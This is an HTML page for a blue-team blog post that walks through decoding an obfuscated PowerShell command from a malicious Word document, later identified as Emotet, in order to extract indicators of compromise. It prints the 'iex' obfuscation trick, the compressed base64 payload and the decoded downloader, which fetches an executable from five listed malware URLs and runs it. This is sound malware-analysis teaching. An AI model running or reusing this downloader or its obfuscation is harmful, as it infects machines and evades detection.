@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.0 -->
+<title>Deeper analysis through PowerShell decoding | Network Security Ninja</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Deeper analysis through PowerShell decoding" />
+<meta name="author" content="Jeremiah Bess" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding." />
+<meta property="og:description" content="Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding." />
+<link rel="canonical" href="http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html" />
+<meta property="og:url" content="http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html" />
+<meta property="og:site_name" content="Network Security Ninja" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-03-16T00:00:00-06:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Deeper analysis through PowerShell decoding","url":"http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html","dateModified":"2019-03-16T00:00:00-06:00","datePublished":"2019-03-16T00:00:00-06:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html"},"author":{"@type":"Person","name":"Jeremiah Bess"},"description":"Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Network Security Ninja" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Network Security Ninja</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Deeper analysis through PowerShell decoding</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-03-16T00:00:00-06:00" itemprop="datePublished">Mar 16, 2019
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding.</p>
+
+<h1 id="basic-analysis">Basic Analysis</h1>
+
+<p>A co-worker shared an unknown <a href="https://app.any.run/tasks/4c15f487-9f74-4e72-9ad6-540dc32c6148">malware sample</a> from my favorite site, Any.run, and asked if I could help him decode it and determine the malware. From the processes on Any.run we can see that a Word Document is run, followed by some PowerShell actions. We also see in the network connections PowerShell called out to 2 suspicious domains.</p>
+
+<p class="center"><img src="/assets/anyrun-processes.png" alt="Any.run process list" /></p>
+
+<p class="center"><img src="/assets/anyrun-connections.png" alt="Any.run connections list" /></p>
+
+<p>This gives us some indicators we can run with:</p>
+
+<ul>
+  <li>Word Doc file hash and name</li>
+  <li>Two suspicious domains/IPs contacted over port 443</li>
+</ul>
+
+<p>Just like if we ran this in our own malware analysis VM, this is about where many Analysts would stop. However, there is so much more to learn here, but for the purposes of this post let’s focus on what PowerShell is doing.</p>
+
+<h1 id="base64-decoding">Base64 Decoding</h1>
+
+<p>Within Any.run clicking on PowerShell under Processes, then More Info below will show the commands being run. In this case, it’s a Base64 encoded PowerShell command.</p>
+
+<p class="center"><img src="/assets/anyrun-commandline.png" alt="Any.run more info" /></p>
+
+<p>This is simple enough to decode using <code class="highlighter-rouge">echo &lt;baseb4&gt; | base64 -d</code> in Linux, or <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Remove_null_bytes()&amp;input=TGdBZ0FDZ0FJQUFrQUZBQWN3QklBRzhBVFFCbEFGc0FOQUJkQUNzQUpBQlFBSE1BYUFCUEFHMEFSUUJiQURNQU1BQmRBQ3NBSndCWUFDY0FLUUFvQUc0QVJRQlhBQzBBYndCaUFFb0FaUUJqQUZRQUlBQkpBRzhBTGdCREFFOEFiUUJ3QUZJQVJRQlRBRk1BU1FCUEFHNEFMZ0JFQUdVQVpnQk1BRUVBZEFCRkFITUFWQUJ5QUVVQVFRQnRBQ2dBV3dCcEFHOEFMZ0JOQUVVQWJRQlBBRklBV1FCVEFIUUFjZ0JGQUdFQWJRQmRBRnNBY3dCWkFGTUFWQUJGQUUwQUxnQmpBRzhBYmdCV0FHVUFVZ0IwQUYwQU9nQTZBRVlBY2dCdkFFMEFZZ0JCQUhNQVpRQTJBRFFBVXdCMEFISUFhUUJ1QUVjQUtBQW9BQ2NBVmdCYUFDY0FLd0FuQUVJQVpBQmhBRGtBY3dCM0FFWUFKd0FyQUNjQVNRQmlBQzhBYVFCcEFEUUFUUUJUQUhNQWFBQnpBSG9BSndBckFDY0FOZ0IwQUdnQWNBQW5BQ3NBSndCakFHSUFVUUJKQUNjQUt3QW5BRFFBZFFCSEFGRUFUZ0JyQUhjQVNRQlVBRkVBSndBckFDY0FUZ0FuQUNzQUp3Qm5BRElBUVFBbkFDc0FKd0J5QUVvQU5RQkdBR2tBVndCNkFFc0FUd0JGQUhFQVpRQkZBQ2NBS3dBbkFDOEFVQUFuQUNzQUp3Qm1BQ2NBS3dBbkFFb0FKd0FyQUNjQVZ3QTVBSEFBZFFCMUFHZ0FWQUJRQUdVQVlnQXJBQ2NBS3dBbkFEZ0FKd0FyQUNjQVNBQk9BQ2NBS3dBbkFHY0FhUUJCQURnQWFBQlRBQ3NBYUFCUEFHMEFTQUJIQUVzQVlRQmxBQ2NBS3dBbkFFRUFjZ0JYQUhvQVVBQW5BQ3NBSndCQ0FGVUFXUUFyQUNzQVlnQW5BQ3NBSndCakFHOEFMd0JEQUdzQWFBQTVBRzhBWndCNEFHTUFjd0FuQUNzQUp3QnpBQ2NBS3dBbkFERUFjUUJvQUhRQUp3QXJBQ2NBWndCUUFHY0FWQUJ1QUdjQUp3QXJBQ2NBUlFBbkFDc0FKd0JMQUZvQUp3QXJBQ2NBV0FCWEFDY0FLd0FuQUhRQWJ3QmxBQ2NBS3dBbkFFZ0FUUUFuQUNzQUp3Qk1BRk1BZVFBd0FFd0FTd0JXQUNjQUt3QW5BSGdBYmdCaUFFc0FlUUJ4QUUwQVNRQm9BQ2NBS3dBbkFFY0FKd0FyQUNjQWJnQkRBQ2NBS3dBbkFIWUFkZ0JYQUV3QVZBQmhBQ2NBS3dBbkFFNEFNQUJsQUVZQVl3QXJBR2dBSndBckFDY0FOQUF2QUhZQVdnQk9BQzhBTXdCM0FGVUFKd0FyQUNjQU53QXdBREFBY0FCbkFDY0FLd0FuQUZjQUp3QXJBQ2NBT0FCUkFEZ0FKd0FyQUNjQWJnQmtBSE1BYndCMkFFZ0FWd0JoQUNjQUt3QW5BQzhBTXdCWUFEa0FKd0FyQUNjQWFRQldBR2tBY0FCa0FHRUFWZ0FuQUNzQUp3QlZBRVlBSndBckFDY0Fid0JvQUdrQUp3QXJBQ2NBUlFCc0FFSUFZZ0F4QUdNQVdRQlBBRWdBT0FCUEFHNEFNUUFuQUNzQUp3QnFBSFlBTVFCRUFFc0FKd0FyQUNjQVpnQXlBRElBSndBckFDY0FUUUJpQURJQWRRQW5BQ3NBSndCVUFHSUFSUUJLQUU0QVRnQndBQ2NBS3dBbkFGQUFKd0FyQUNjQWVnQTJBR2tBVEFCdkFEY0FMd0JqQUNjQUt3QW5BR2NBU0FCV0FFOEFjQUJ6QUZnQWRRQTBBRkFBZWdBbkFDc0FKd0JEQUNjQUt3QW5BRGdBT1FBMEFEQUFlQUFuQUNzQUp3Qm1BREFBY0FBekFFb0FZd0JvQUVRQVpRQmFBSFFBY2dCbEFIa0FTUUJRQUhRQVNnQjRBRFFBYWdBbkFDc0FKd0JWQUhjQUp3QXJBQ2NBYUFCV0FGVUFaZ0JNQUZZQVRnQmhBR01BUkFCbkFDY0FLd0FuQUVRQWRRQkRBRllBZVFCeEFFY0FRUUJDQUVvQUp3QXJBQ2NBUXdCVkFEQUFLd0JxQUNjQUt3QW5BRFFBY3dCQkFEVUFKd0FyQUNjQWR3QkVBRm9BSndBckFDY0FPQUFuQUNzQUp3QjNBR2dBZWdBckFHUUFKd0FyQUNjQVZnQnNBRU1BT0FCcEFEa0FlZ0JrQUNjQUt3QW5BRzRBUVFBbkFDc0FKd0JRQUdzQWNRQTVBRllBUXdCbUFDY0FLd0FuQUVnQWJ3QTBBRWdBTndCT0FISUFUd0JpQUNjQUt3QW5BRVlBVndCT0FFVUFKd0FyQUNjQUx3QnhBRXdBSndBckFDY0FWQUFuQUNzQUp3QnRBRFFBUXdCRkFIZ0FjZ0JuQUVjQVZ3QW5BQ3NBSndCdEFIa0FUZ0JTQUNjQUt3QW5BREFBVndCUkFHOEFOZ0E0QURVQVZBQktBR1lBUndBbkFDc0FKd0JWQUdFQVZRQktBR2dBT1FCaUFHb0FKd0FyQUNjQWFRQXJBRElBWlFBbkFDc0FKd0EzQUNjQUt3QW5BSFlBWXdCMEFHY0FMd0FuQUNzQUp3QTBBQ2NBS3dBbkFISUFKd0FyQUNjQVpBQlRBRlFBVlFBekFISUFTQUFuQUNzQUp3QjJBRFVBUXdCaUFHd0FPQUIwQUNjQUt3QW5BRFlBWXdBbkFDc0FKd0J4QUNjQUt3QW5BRzhBT1FCUkFFb0FlZ0JUQUV3QVRRQW5BQ3NBSndCMUFHTUFRd0JWQURFQWJRQlhBQ2NBS3dBbkFIb0FKd0FyQUNjQVNRQmhBQ2NBS3dBbkFGUUFaQUJJQUNjQUt3QW5BRFlBSndBckFDY0FUUUEwQUhZQVRnQkNBQ2NBS3dBbkFIZ0FKd0FyQUNjQWJnQlZBSEVBSndBckFDY0FTQUJrQUZjQVJRQnVBQ3NBU0FCS0FDY0FLd0FuQUZBQU53QnhBRE1BY0FCb0FDY0FLd0FuQUdNQUp3QXJBQ2NBV2dBbkFDc0FKd0IyQUhBQUp3QXJBQ2NBYXdBbkFDc0FKd0JMQUhZQWVRQW5BQ3NBSndCUUFDY0FLd0FuQUdNQUt3QlZBRm9BUndCNkFIRUFiZ0JzQUNjQUt3QW5BRXdBYXdCM0FDY0FLd0FuQUdFQU1BQmhBQ2NBS3dBbkFGUUFKd0FyQUNjQU1BQnJBQ2NBS3dBbkFGY0FkQUFuQUNzQUp3QnJBSFVBZEFBbkFDc0FKd0JXQUVZQVJnQmlBRWtBSndBckFDY0FlUUFuQUNzQUp3QXZBRmdBY1FCNkFGY0FUZ0FuQUNzQUp3QjFBRmtBUXdCd0FGTUFNZ0FuQUNzQUp3QnhBRFlBYWdBekFHd0FNUUI0QUcwQUp3QXJBQ2NBZGdCM0FDY0FLd0FuQUVjQUp3QXBBQ2tBSUFBc0FDQUFXd0JwQUU4QUxnQmpBRThBVFFCUUFISUFSUUJUQUhNQWFRQlBBRzRBTGdCREFFOEFiUUJ3QUhJQVpRQnpBSE1BYVFCdkFHNEFUUUJ2QUVRQVpRQmRBRG9BT2dCRUFHVUFZd0JQQUUwQWNBQlNBRVVBY3dCVEFDa0FmQUJtQUc4QWNnQkZBR0VBUXdCSUFIc0FJQUJ1QUVVQVZ3QXRBRzhBWWdCS0FHVUFZd0JVQUNBQUlBQnBBRThBTGdCekFIUUFVZ0JsQUVFQVRRQlNBRVVBWVFCa0FFVUFVZ0FvQUNBQUpBQmZBQ0FBTEFBZ0FGc0Fjd0I1QUZNQWRBQmxBRTBBTGdCVUFHVUFlQUJVQUM0QVJRQnVBR01BVHdCa0FHa0FUZ0JuQUYwQU9nQTZBRUVBVXdCREFFa0FTUUFwQUNBQWZRQWdBSHdBSUFCR0FHOEFjZ0JsQUVFQVF3QklBSHNBSUFBa0FGOEFMZ0JTQUdVQVlRQkVBRlFBYndCbEFFNEFaQUFvQUNrQWZRQXBBQT09">CyberChef</a> (another favorite tool) as seen below, but first remove the <code class="highlighter-rouge">powershell -e</code> command to work with the raw base64. Once decoded we see that there is a period preceding the rest of the code, which is a Call Operator. This essentially runs code from another script or function.</p>
+
+<p class="center"><img src="/assets/cyberchef-base64.png" alt="CyberChef base64" /></p>
+
+<p>What this Call Operator runs is an obfuscation trick to hide the command “iex”, which is an alias for Invoke-Expression.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="o">(</span><span class="nv">$PsHoMe</span><span class="o">[</span>4]+<span class="nv">$PshOmE</span><span class="o">[</span>30]+<span class="s1">'X'</span><span class="o">)</span></code></pre></figure>
+
+<p>The trick is they sliced letters from the output of the $pshome variable, which normally outputs the full path to PowerShell, and appended an X forming the word <code class="highlighter-rouge">ieX</code> when it’s concatenated.</p>
+
+<h1 id="deflate-memory-stream">Deflate Memory Stream</h1>
+
+<p>The expression to be executed which follows contains statements about deflating a memory stream, which means the best way to handle this is to let PowerShell do the work for us. We just have to de-fang the code so it won’t actually run and infect us. <em>You are using a lab VM with the network disabled and a snapshot already completed, aren’t you?</em></p>
+
+<p>First, remove the period at the beginning and the ($PsHoMe[4]+$PshOmE[30]+’X’). You should be left with the following:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="o">(</span><span class="nb">nEW-obJecT </span>Io.COmpRESSIOn.DefLAtEsTrEAm<span class="o">([</span>io.MEmORYStrEam][sYSTEM.conVeRt]::FroMbAse64StrinG<span class="o">((</span><span class="s1">'VZBda9swFIb/ii4MSshsz6thpcbQI4uGQNkwITQNg2ArJ5FiWzKOEqeE/PfJW9puuhTPeb+8HNgiA8hS+hOmHGKaeArWzPBUY++bco/Ckh9ogxcss1qhtgPgTngEKZXWtoeHMLSy0LKVxnbKyqMIhGnCvvWLTaN0eFc+h4/vZN/3wU700pgW8Q8ndsovHWa/3X9iVipdaVUFohiElBb1cYOH8On1jv1DKf22Mb2uTbEJNNpPz6iLo7/cgHVOpsXu4PzC8940xf0p3JchDeZtreyIPtJx4jUwhVUfLVNacDgDuCVyqGABJCU0+j4sA5wDZ8whz+dVlC8i9zdnAPkq9VCfHo4H7NrObFWNE/qLTm4CExrgGWmyNR0WQo685TJfGUaUJh9bji+2e7vctg/4rdSTU3rHv5Cbl8t6cqo9QJzSLMucCU1mWzIaTdH6M4vNBxnUqHdWEn+HJP7q3phcZvpkKvyPc+UZGzqnlLkwa0aT0kWtkutVFFbIy/XqzWNuYCpS2q6j3l1xmvwG'</span><span class="o">))</span> , <span class="o">[</span>iO.cOMPrESsiOn.COmpressionMoDe]::DecOMpREsS<span class="o">)</span>|forEaCH<span class="o">{</span> <span class="nb">nEW-obJecT </span>iO.stReAMREadER<span class="o">(</span> <span class="nv">$_</span> , <span class="o">[</span>sySteM.TexT.EncOdiNg]::ASCII<span class="o">)</span> <span class="o">}</span> | <span class="k">ForeACH</span><span class="o">{</span> <span class="nv">$_</span>.ReaDToeNd<span class="o">()})</span></code></pre></figure>
+
+<p>If you copy the command above string and paste it into a PowerShell prompt, the deflate memory strem functions will run and you get this output (output highlighted):</p>
+
+<p class="center"><img src="/assets/ps-code-run.png" alt="PowerShell code run" /></p>
+
+<h1 id="clean-upformat-code">Clean Up/Format Code</h1>
+
+<p>Again, we could stop here and pull out the clear-text URLs which can be blocked and/or hunted for in your network. However, there is still more we can pull from this code. You may already see it if you have a sharp eye, but to make the code more readable let’s replace all the semicolons with carriage return characters (\r\n). You can do this with a using regex find/replace functions found in more advanced text editors like Notepad++ or just use CyberChef. Now the code should look like this:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$QABUCAAC</span><span class="o">=</span><span class="s1">'OAGDA4'</span>
+<span class="nv">$iA_BoD</span><span class="o">=</span><span class="nb">new-object </span>Net.WebClient
+<span class="nv">$iAUCAD1A</span><span class="o">=</span><span class="s1">'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'</span>.Split<span class="o">(</span><span class="s1">'@'</span><span class="o">)</span>
+<span class="nv">$mAGAZw1X</span><span class="o">=</span><span class="s1">'aDAxAA'</span>
+<span class="nv">$QAkAUA</span> <span class="o">=</span> <span class="s1">'174'</span>
+<span class="nv">$ADDADBBX</span><span class="o">=</span><span class="s1">'LxZ1QU1'</span>
+<span class="nv">$SBAAQZ</span><span class="o">=</span><span class="nv">$env</span>:userprofile+<span class="s1">'\'</span>+<span class="nv">$QAkAUA</span>+<span class="s1">'.exe'</span>
+<span class="k">foreach</span><span class="o">(</span><span class="nv">$XXQZoB</span> <span class="k">in</span> <span class="nv">$iAUCAD1A</span><span class="o">){</span><span class="k">try</span><span class="o">{</span><span class="nv">$iA_BoD</span>.DownloadFile<span class="o">(</span><span class="nv">$XXQZoB</span>, <span class="nv">$SBAAQZ</span><span class="o">)</span>
+<span class="nv">$vAUAwAA4</span><span class="o">=</span><span class="s1">'CCCQAk'</span>
+<span class="k">If</span> <span class="o">((</span><span class="nb">Get-Item</span> <span class="nv">$SBAAQZ</span><span class="o">)</span>.length -ge 40000<span class="o">)</span> <span class="o">{</span><span class="nb">Invoke-Item</span> <span class="nv">$SBAAQZ</span>
+<span class="nv">$mBBAxAA</span><span class="o">=</span><span class="s1">'BAD1_B'</span>
+<span class="k">break</span>
+<span class="o">}}</span><span class="k">catch</span><span class="o">{}}</span><span class="nv">$S4DoAGc</span><span class="o">=</span><span class="s1">'p_1wBAAD'</span></code></pre></figure>
+
+<p>A quick review of the code will show there are some variables set that are garbage, never used elsewhere. With Notepad++ I found if I double-click to highlight each of the variables, it will also highlight other places it is called. So any variable name that isn’t called is useless and can be removed. But you can also manually review the code and remove any variables that are junk. So let’s remove those and get to this point:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$iA_BoD</span><span class="o">=</span><span class="nb">new-object </span>Net.WebClient
+<span class="nv">$iAUCAD1A</span><span class="o">=</span><span class="s1">'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'</span>.Split<span class="o">(</span><span class="s1">'@'</span><span class="o">)</span>
+<span class="nv">$QAkAUA</span> <span class="o">=</span> <span class="s1">'174'</span>
+<span class="nv">$SBAAQZ</span><span class="o">=</span><span class="nv">$env</span>:userprofile+<span class="s1">'\'</span>+<span class="nv">$QAkAUA</span>+<span class="s1">'.exe'</span>
+<span class="k">foreach</span><span class="o">(</span><span class="nv">$XXQZoB</span> <span class="k">in</span> <span class="nv">$iAUCAD1A</span><span class="o">){</span><span class="k">try</span><span class="o">{</span><span class="nv">$iA_BoD</span>.DownloadFile<span class="o">(</span><span class="nv">$XXQZoB</span>, <span class="nv">$SBAAQZ</span><span class="o">)</span>
+<span class="k">If</span> <span class="o">((</span><span class="nb">Get-Item</span> <span class="nv">$SBAAQZ</span><span class="o">)</span>.length -ge 40000<span class="o">)</span> <span class="o">{</span><span class="nb">Invoke-Item</span> <span class="nv">$SBAAQZ</span>
+<span class="k">break</span>
+<span class="o">}}</span><span class="k">catch</span><span class="o">{}}</span></code></pre></figure>
+
+<p>You may be able to read the code just fine from this point, however here’s a beautified version with indents to properly nest operations:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$iA_BoD</span><span class="o">=</span><span class="nb">new-object </span>Net.WebClient
+<span class="nv">$iAUCAD1A</span><span class="o">=</span><span class="s1">'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'</span>.Split<span class="o">(</span><span class="s1">'@'</span><span class="o">)</span>
+<span class="nv">$QAkAUA</span> <span class="o">=</span> <span class="s1">'174'</span>
+<span class="nv">$SBAAQZ</span><span class="o">=</span><span class="nv">$env</span>:userprofile+<span class="s1">'\'</span>+<span class="nv">$QAkAUA</span>+<span class="s1">'.exe'</span>
+<span class="k">foreach</span><span class="o">(</span><span class="nv">$XXQZoB</span> <span class="k">in</span> <span class="nv">$iAUCAD1A</span><span class="o">){</span>
+    <span class="k">try</span><span class="o">{</span>
+        <span class="nv">$iA_BoD</span>.DownloadFile<span class="o">(</span><span class="nv">$XXQZoB</span>, <span class="nv">$SBAAQZ</span><span class="o">)</span>
+        <span class="k">If</span> <span class="o">((</span><span class="nb">Get-Item</span> <span class="nv">$SBAAQZ</span><span class="o">)</span>.length -ge 40000<span class="o">)</span> <span class="o">{</span>
+            <span class="nb">Invoke-Item</span> <span class="nv">$SBAAQZ</span>
+            <span class="k">break</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">catch</span><span class="o">{}</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>Now we can see a couple more things. First, the download is saved as 174.exe in the root of the user’s profile. Second, the URLs are tried one at a time until the download file size is greater than 40KB, and if not it moves to the next URL in the list.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>So with a little bit of extra work, we’ve come up with several more IOCs that we would have otherwise missed. And in case you were wondering, this malware sample turned out to be Emotet after doing some OSINT searches for the URLs discovered.</p>
+
+<ul>
+  <li>C:\Users&lt;userprofile&gt;\174.exe</li>
+  <li>https://thanhphotrithuc.com/wp-admin/3bL/</li>
+  <li>https://www.gcwhoopee.com/cgi-bin/t28/</li>
+  <li>https://thinknik.ca/wp-includes/FY3B/</li>
+  <li>https://tinydownload.net/wp-admin/1r41/</li>
+  <li>http://tr.capers.co/xjoma8v/jb/</li>
+</ul>
+
+
+  </div><a class="u-url" href="/analysis/2019/03/16/deeper-analysis-through-powershell-decoding.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Network Security Ninja</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Jeremiah Bess</li><li><a class="u-email" href="mailto:jeremiah.bess@gmail.com">jeremiah.bess@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/netsecninja"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">netsecninja</span></a></li><li><a href="https://www.linkedin.com/in/jeremiahbess"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">jeremiahbess</span></a></li><li><a href="https://www.twitter.com/netsecninja"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">netsecninja</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>A blog to post my Tactics, Techniques, and Procedures (TTPs) as a card-carrying member of the Blue Team (Cyber Defense). </p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
